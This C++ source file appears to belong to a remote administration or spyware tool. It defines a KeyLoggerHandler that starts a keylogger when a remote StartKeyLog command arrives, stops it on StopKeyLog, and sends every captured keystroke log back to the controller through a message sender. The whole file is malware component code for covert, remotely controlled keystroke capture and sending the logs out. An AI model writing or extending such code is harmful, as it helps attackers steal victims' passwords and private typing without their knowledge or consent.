#include "KeyLoggerHandler.h"

KeyLoggerHandler::KeyLoggerHandler(std::shared_ptr<IMessageSender> sender) :
	_sender(sender)
{
}

void KeyLoggerHandler::Handle(MessageType type, SharedSpan content)
{
	switch(type)
	{
	case MessageType::StartKeyLog:
		if (_keyLogger == nullptr)
		{
			_keyLogger = std::make_unique<KeyLoggerOwner>(
				[&](auto log) { return OnKeyLog(log); });
		}
		break;

	case MessageType::StopKeyLog:
		_keyLogger.reset();
		break;
	}
}

void KeyLoggerHandler::OnKeyLog(const std::string& log) const
{
	_sender->Send(MessageType::KeyLogMessage, SharedSpan(log));
}
